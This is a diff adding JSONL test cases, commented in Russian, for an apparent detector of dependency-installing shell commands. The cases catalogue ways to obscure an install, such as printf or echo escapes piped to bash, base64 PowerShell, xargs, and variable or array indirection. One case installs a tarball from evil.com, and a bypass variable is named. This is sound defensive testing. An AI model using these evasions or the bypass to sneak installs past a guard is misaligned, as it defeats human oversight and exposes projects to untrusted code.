@@ -1562,3 +1562,127 @@
 {"source": "edge", "command": "cat <<E\n$(echo a #\\\n)\nnpm install left-pad)\nE", "expect": "add"}
 {"source": "edge", "command": "cat <<E\nx\\\nE\nnpm install left-pad", "expect": "pass"}
 {"source": "edge", "command": "cat <<'E'\nE\\\n\nnpm install left-pad", "expect": "pass"}
+{"source": "edge", "command": "printf 'npm\\040i lodash\\n' | bash", "expect": "add", "//": "printf раскрывает \\NNN формата (bash 5.3): оболочка получает `npm i lodash`"}
+{"source": "edge", "command": "echo -e 'npm\\x20i lodash' | bash", "expect": "add", "//": "echo -e раскрывает \\xHH (bash 5.3)"}
+{"source": "edge", "command": "printf '%s %s %s\\n' npm i lodash | bash", "expect": "add", "//": "формат printf с аргументами: вывод `npm i lodash`"}
+{"source": "edge", "command": "printf 'echo %s\\n' 'npm i x' | bash", "expect": "pass", "//": "формат printf: оболочка исполняет `echo npm i x`"}
+{"source": "edge", "command": "printf '%d\\n' 5 | bash", "expect": "doubt", "//": "спецификатор вне %s/%b/%c: вывод не строится, сомнение; обход — PLANKA_DEP_OK=1"}
+{"source": "edge", "command": "bash <(echo 'npm i lodash') arg", "expect": "add", "//": "скрипт bash — процесс-подстановка, `arg` — его аргумент"}
+{"source": "edge", "command": "source <(echo 'npm i lodash') arg", "expect": "add", "//": "скрипт source — процесс-подстановка"}
+{"source": "edge", "command": "pip install -r <(echo) evil", "expect": "add", "//": "процесс-подстановка — значение -r, `evil` — пакет"}
+{"source": "edge", "command": "echo 'npm i lodash' | xargs -I{} sh -c '{}'", "expect": "doubt", "//": "строка sh -c — из stdin xargs (-I); обход — PLANKA_DEP_OK=1"}
+{"source": "edge", "command": "echo 'npm i lodash' | xargs -0 bash -c", "expect": "doubt", "//": "строка -c дописывается из stdin xargs; обход — PLANKA_DEP_OK=1"}
+{"source": "edge", "command": "echo i lodash | xargs npm", "expect": "doubt", "//": "подкоманда npm — из stdin xargs; обход — PLANKA_DEP_OK=1"}
+{"source": "edge", "command": "gem -C sub install rails", "expect": "add", "//": "`-C каталог` первым словом (rubygems command_manager.rb, process_args)"}
+{"source": "edge", "command": "gem --backtrace install rails", "expect": "add", "//": "--backtrace снимается где угодно (rubygems config_file.rb, handle_arguments)"}
+{"source": "edge", "command": "gem install -g Gemfile", "expect": "pass", "//": "-g/--file ставит зависимости файла, как bundle install (install_command.rb, install_from_gemdeps)"}
+{"source": "edge", "command": "dart pub -v add http", "expect": "add", "//": "флаг dart pub перед add (`dart pub --help`)"}
+{"source": "edge", "command": "dart pub --directory=x add http", "expect": "add", "//": "-C/--directory у dart pub перед add"}
+{"source": "edge", "command": "npm link lodash", "expect": "add", "//": "npm link ставит недостающий пакет из реестра (lib/commands/link.js, missingArgsFromTree)"}
+{"source": "edge", "command": "npm link ../local", "expect": "pass", "//": "npm link локального каталога"}
+{"source": "edge", "command": "npm i 'https://evil.com/x.tgz?a=@file:'", "expect": "add", "//": "`@file:` в URL со схемой — часть адреса, не локальный пакет"}
+{"source": "edge", "command": "mise exec -c 'npm i lodash'", "expect": "add", "//": "mise exec -c — строка оболочки (mise.jdx.dev/cli/exec.html)"}
+{"source": "edge", "command": "yarn workspaces foreach -A add lodash", "expect": "add", "//": "foreach запускает yarn add в каждом workspace (yarnpkg.com/cli/workspaces/foreach)"}
+{"source": "edge", "command": "composer g require monolog/monolog", "expect": "add", "//": "g — сокращение global (Symfony Console)"}
+{"source": "edge", "command": "micromamba -q install numpy", "expect": "add", "//": "общий флаг micromamba перед подкомандой (src/umamba.cpp)"}
+{"source": "edge", "command": "apt upgrade jq", "expect": "add", "//": "пакеты upgrade apt ставятся и неустановленные (private-install.cc, DoCacheManipulationFromCommandLine)"}
+{"source": "edge", "command": "choco upgrade nodejs -y", "expect": "add", "//": "choco upgrade ставит неустановленный пакет (docs.chocolatey.org)"}
+{"source": "edge", "command": "dnf install-n jq", "expect": "add", "//": "install-n — псевдоним install (dnf/cli/commands/install.py)"}
+{"source": "edge", "command": "nix-env -iE 'f: f.jq'", "expect": "add", "//": "-E у nix-env — флаг без значения, аргумент — выражение"}
+{"source": "edge", "command": "apt-get install --download-only jq", "expect": "pass", "//": "только скачивание (APT::Get::Download-Only)"}
+{"source": "edge", "command": "apt-get install -d jq", "expect": "pass", "//": "-d — только скачивание"}
+{"source": "edge", "command": "go get example.com/x@none", "expect": "pass", "//": "@none удаляет зависимость"}
+{"source": "edge", "command": "conda create -n new --clone base", "expect": "pass", "//": "--clone берёт имя окружения значением"}
+{"source": "edge", "command": "docker exec c sh -c 'npm i x'", "expect": "doubt", "//": "строка, которую программа может исполнить, — команда установки"}
+{"source": "edge", "command": "echo npm i x | parallel", "expect": "doubt", "//": "stdin программы — команда установки"}
+{"source": "edge", "command": "X=\"npm install x\"; $X", "expect": "doubt", "//": "имя команды — переменная со значением установки из текста"}
+{"source": "edge", "command": "/usr/bin/np? install x", "expect": "doubt", "//": "шаблон имён в имени команды даёт npm"}
+{"source": "edge", "command": "alias n=npm\nn install x", "expect": "doubt", "//": "alias из текста даёт npm"}
+{"source": "edge", "command": "git -c core.pager='npm i x' log", "expect": "doubt", "//": "git исполняет строку core.pager"}
+{"source": "edge", "command": "su --comm 'npm i x'", "expect": "add", "//": "getopt_long: --comm — сокращение --command"}
+{"source": "edge", "command": "pwsh -EncodedCommand bgBwAG0AIABpACAAeAA=", "expect": "add", "//": "base64 UTF-16LE строки «npm i x»"}
+{"source": "edge", "command": "parallel ::: 'make all'", "expect": "pass", "//": "строка без команды установки"}
+{"source": "edge", "command": "printf '\\%s' 'npm i y' | bash", "expect": "add", "//": "неизвестное экранирование формата printf: печатается `\\`, `%s` разбирается дальше"}
+{"source": "edge", "command": "echo 'npm i x' | xargs -0I{} sh -c {}", "expect": "doubt", "//": "склейка коротких флагов xargs с -I по getopt"}
+{"source": "edge", "command": "echo 'npm i x' | xargs -ri sh -c {}", "expect": "doubt", "//": "-i в склейке: замена {} без значения"}
+{"source": "edge", "command": "echo npm i x | xargs env", "expect": "doubt", "//": "обёртка без своей команды за xargs: команда — слова stdin"}
+{"source": "edge", "command": "echo npm i x | xargs timeout 5", "expect": "doubt", "//": "обёртка с операндом без своей команды за xargs"}
+{"source": "edge", "command": "/usr/bin/pi[p] install x", "expect": "doubt", "//": "шаблон имён даёт имя менеджера, узнаваемое регулярным выражением"}
+{"source": "edge", "command": "a=(npm i x); \"${a[@]}\"", "expect": "doubt", "//": "имя команды — элементы массива из текста"}
+{"source": "edge", "command": "set -- npm i x; \"$@\"", "expect": "doubt", "//": "имя команды — позиционные параметры set --"}
+{"source": "edge", "command": "X=npm; Y=\"i x\"; $X $Y", "expect": "doubt", "//": "имя и слова за ним — переменные из текста"}
+{"source": "edge", "command": "X=$(echo npm i x); $X", "expect": "doubt", "//": "вычисляемое значение переменной-имени"}
+{"source": "edge", "command": "read X <<< 'npm i x'; $X", "expect": "doubt", "//": "значение read из here-string"}
+{"source": "edge", "command": "printf -v X 'npm i x'; $X", "expect": "doubt", "//": "значение printf -v"}
+{"source": "edge", "command": "git commit -am 'Add dep\n\nnpm install lodash'", "expect": "pass", "//": "склейка -am: следующее слово — сообщение коммита"}
+{"source": "edge", "command": "fish -iC 'npm i x'", "expect": "add", "//": "склейка коротких флагов fish с -C по getopt"}
+{"source": "edge", "command": "echo 'npm i x' | pbcopy", "expect": "pass", "//": "pbcopy кладёт stdin в буфер обмена"}
+{"source": "edge", "command": "set -o; ls", "expect": "pass", "//": "set -o последним печатает настройки, позиционные параметры не меняет"}
+{"source": "edge", "command": "saved=$(set +o)", "expect": "pass", "//": "set +o последним печатает команды настроек"}
+{"source": "edge", "command": "echo 'npm i x' | wl-copy", "expect": "pass", "//": "wl-copy кладёт stdin в буфер обмена"}
+{"source": "edge", "command": "set -eo pipefail npm i x; \"$@\"", "expect": "doubt", "//": "буква o в склейке -eo берёт имя настройки: позиционные параметры — npm i x"}
+{"source": "edge", "command": "set -oe pipefail npm i x; \"$@\"", "expect": "doubt", "//": "буква o в склейке -oe берёт имя настройки следующим словом"}
+{"source": "edge", "command": "set -euo pipefail; \"$@\"", "expect": "pass", "//": "pipefail — имя настройки, позиционные параметры не меняются"}
+{"source": "edge", "command": "set -- npm install x; $1 $2 $3", "expect": "doubt", "//": "позиционные параметры по номеру"}
+{"source": "edge", "command": "set -- npm i x; ${1} ${2} ${3}", "expect": "doubt", "//": "позиционные параметры по номеру в фигурных скобках"}
+{"source": "edge", "command": "set -- npm i x; $10", "expect": "pass", "//": "$10 — $1 и «0»: команда npm0"}
+{"source": "edge", "command": "set -- ls -la; $1 $2", "expect": "pass", "//": "значения позиционных параметров без установки"}
+{"source": "edge", "command": "set -- x npm i x; shift; \"$@\"", "expect": "doubt", "//": "shift приводит менеджер в начало параметров"}
+{"source": "edge", "command": "set -- x y npm i x; shift 2; $*", "expect": "doubt", "//": "shift N — сдвиг на N"}
+{"source": "edge", "command": "set -- x npm i x; \"${@:2}\"", "expect": "doubt", "//": "срез ${@:N} — хвост параметров"}
+{"source": "edge", "command": "set -- npm i x; $1 \"${@:2}\"", "expect": "doubt", "//": "номер и срез вместе"}
+{"source": "edge", "command": "set -- a b c; shift; \"$@\"", "expect": "pass", "//": "сдвинутые параметры без установки"}
+{"source": "edge", "command": "set -o -o pipefail npm i x; \"$@\"", "expect": "doubt", "//": "-o перед словом с «-» имени настройки не берёт: -o pipefail — следующая пара"}
+{"source": "edge", "command": "set -o -o pipefail ls -la; \"$@\"", "expect": "pass", "//": "то же без установки"}
+{"source": "edge", "command": "X=\"npm i lodash\"; ${X:-y}", "expect": "doubt", "//": "${X:-w} — значение переменной"}
+{"source": "edge", "command": "X=\"npm i x\"; ${X:?y}", "expect": "doubt", "//": "${X:?w} — значение переменной"}
+{"source": "edge", "command": "Y=\"npm i x\"; ${X:+y} $Y", "expect": "doubt", "//": "${X:+w} у пустой переменной — пустое имя, команда — следующие слова"}
+{"source": "edge", "command": "set -- npm i lodash; ${1:-y} $2 $3", "expect": "doubt", "//": "${N:-w} — позиционный параметр"}
+{"source": "edge", "command": "a=(x npm i lodash); \"${a[@]:1}\"", "expect": "doubt", "//": "срез массива ${a[@]:N} — хвост элементов"}
+{"source": "edge", "command": "a=(x npm i x --dry-run); \"${a[@]:1:3}\"", "expect": "doubt", "//": "срез массива с длиной отбрасывает --dry-run"}
+{"source": "edge", "command": "set -- x npm i x --dry-run; \"${@:2:3}\"", "expect": "doubt", "//": "срез параметров с длиной отбрасывает --dry-run"}
+{"source": "edge", "command": "X=\"npm i x\"; ${X+y}", "expect": "pass", "//": "${X+w} у заданной переменной — слово w"}
+{"source": "edge", "command": "set -- x npm i x; ${@:-y}", "expect": "pass", "//": "${@:-w} — параметры целиком: команда x"}
+{"source": "edge", "command": "\"${CC:-gcc}\" -o a a.c", "expect": "pass", "//": "значение по умолчанию без установки"}
+{"source": "edge", "command": "${EDITOR:-vi} file", "expect": "pass", "//": "значение по умолчанию без установки"}
+{"source": "edge", "command": "X=\"npm i lodash\"; ${X/q/z}", "expect": "doubt", "//": "замена в ссылке на имя со значением в тексте: bash исполняет npm i lodash"}
+{"source": "edge", "command": "X=\"NPM I LODASH\"; ${X,,}", "expect": "doubt", "//": "смена регистра: bash исполняет npm i lodash"}
+{"source": "edge", "command": "X=\"npm i lodash\"; ${X#q}", "expect": "doubt", "//": "обрезка начала: значение известно только при исполнении"}
+{"source": "edge", "command": "X=\"npm i lodash\"; ${X:0}", "expect": "doubt", "//": "подстрока скаляра: значение известно только при исполнении"}
+{"source": "edge", "command": "Y=X; X=\"npm i lodash\"; ${!Y}", "expect": "doubt", "//": "косвенная ссылка на имя со значением в тексте"}
+{"source": "edge", "command": "X=\"npm i lod\"; ${X}ash", "expect": "doubt", "//": "склейка ссылки с текстом: npm i lodash"}
+{"source": "edge", "command": "a=(x npm i lod); ${a[@]:1}ash", "expect": "doubt", "//": "склейка среза массива с текстом: npm i lodash"}
+{"source": "edge", "command": "X=npm; Y=\"I LODASH\"; $X ${Y,,}", "expect": "doubt", "//": "слово за именем-переменной из ссылки со сменой регистра: npm i lodash"}
+{"source": "edge", "command": "R=/opt/app; ${R}/bin/run", "expect": "pass", "//": "склейка ссылки с путём: программа /opt/app/bin/run"}
+{"source": "edge", "command": "f=a.txt; cat ${f%.txt}.md", "expect": "pass", "//": "имя команды не из ссылки"}
+{"source": "edge", "command": "X=foo; echo ${X^^}", "expect": "pass", "//": "имя команды не из ссылки"}
+{"source": "edge", "command": "\"${PYTHON%3}\" x.py", "expect": "pass", "//": "ссылка без значения в тексте: окружение вне проверки"}
+{"source": "edge", "command": "set -- npm i lodash; read 1 <<< x; $1 $2 $3", "expect": "doubt", "//": "цель read с недопустимым именем: bash отвергает её, позиционные параметры прежние"}
+{"source": "edge", "command": "set -- npm i lodash; read @ <<< x; \"$@\"", "expect": "doubt", "//": "цель read `@`: ошибка bash, параметры не меняются"}
+{"source": "edge", "command": "set -- npm i lodash; printf -v @ x; \"$@\"", "expect": "doubt", "//": "цель printf -v `@`: ошибка bash, параметры не меняются"}
+{"source": "edge", "command": "set -- npm i lodash; printf -v 1 x; $1 $2 $3", "expect": "doubt", "//": "цель printf -v `1`: ошибка bash, параметры не меняются"}
+{"source": "edge", "command": "set -- npm i lodash; read \"@:\" <<< x; \"${@:1}\"", "expect": "doubt", "//": "цель read `@:`: ошибка bash, срез параметров прежний"}
+{"source": "edge", "command": "set -- npm i lodash; ${01} ${02} ${03}", "expect": "doubt", "//": "номер позиционного параметра с ведущим нулём"}
+{"source": "edge", "command": "set -- npm i lodash; \"${01}\" \"${@:02}\"", "expect": "doubt", "//": "ведущий ноль в номере и в начале среза"}
+{"source": "edge", "command": "set -- npm i lodash; ${01:-y} $2 $3", "expect": "doubt", "//": "оператор у номера с ведущим нулём"}
+{"source": "edge", "command": "set -- x npm i lodash; shift; ${01} ${02} ${03}", "expect": "doubt", "//": "ведущий ноль после shift"}
+{"source": "edge", "command": "Y=\"npm i lodash\"; ${X:-$Y}", "expect": "doubt", "//": "слово оператора — ссылка на переменную со значением в тексте"}
+{"source": "edge", "command": "Y=\"npm i lodash\"; ${X:-${Y}}", "expect": "doubt", "//": "слово оператора — ссылка в фигурных скобках"}
+{"source": "edge", "command": "Y=\"npm i lodash\"; X=; ${X:-$Y}", "expect": "doubt", "//": "пустое X: оператор подставляет значение Y"}
+{"source": "edge", "command": "Y=\"npm i lodash\"; ${X-$Y}", "expect": "doubt", "//": "оператор без двоеточия у имени без значения"}
+{"source": "edge", "command": "Y=(npm i lodash); ${X:-\"${Y[@]}\"}", "expect": "doubt", "//": "слово оператора — все элементы массива в кавычках"}
+{"source": "edge", "command": "a=(x npm i lodash); ${a[1]} ${a[2]} ${a[3]}", "expect": "doubt", "//": "элементы массива по одному"}
+{"source": "edge", "command": "X=\"npm i lodash\"; Y=$X; $Y", "expect": "doubt", "//": "цепочка присваивания: значение Y — значение X"}
+{"source": "edge", "command": "X=\"npm i lodash\"; Y=\"$X\"; $Y", "expect": "doubt", "//": "цепочка присваивания через ссылку в кавычках"}
+{"source": "edge", "command": "X=\"npm i lodash\"; Y=${X:-q}; $Y", "expect": "doubt", "//": "цепочка присваивания через оператор"}
+{"source": "edge", "command": "X=\"npm i lodash\"; export Y=${X}; $Y", "expect": "doubt", "//": "цепочка присваивания в export"}
+{"source": "edge", "command": ": ${X:=\"npm i lodash\"}; $X", "expect": "doubt", "//": "присваивание оператором := внутри раскрытия"}
+{"source": "edge", "command": ": ${X=npm}; $X i lodash", "expect": "doubt", "//": "присваивание оператором = внутри раскрытия"}
+{"source": "edge", "command": "f=a.txt; ${EDITOR:-vi} $f", "expect": "pass", "//": "значение по умолчанию без установки"}
+{"source": "edge", "command": "VENV=.venv; ${VENV}/bin/pip list", "expect": "pass", "//": "склейка пути с pip list: не установка"}
+{"source": "edge", "command": "${NPM:-npm} run build", "expect": "pass", "//": "npm run: не установка"}
+{"source": "edge", "command": "args=(-x -v); pytest \"${args[@]:1}\"", "expect": "pass", "//": "срез массива флагов за pytest"}
+{"source": "edge", "command": "NAME=app; docker run ${NAME}:latest", "expect": "pass", "//": "ссылка в аргументе docker"}
+{"source": "edge", "command": "v=3; pip${v} list", "expect": "pass", "//": "pip3 list: не установка"}
+{"source": "edge", "command": "X=pip; Y=$X; $Y list", "expect": "pass", "//": "цепочка присваивания без установки"}
+{"source": "edge", "command": "a=(npm run build); ${a[0]} ${a[1]} ${a[2]}", "expect": "pass", "//": "элементы массива без установки"}
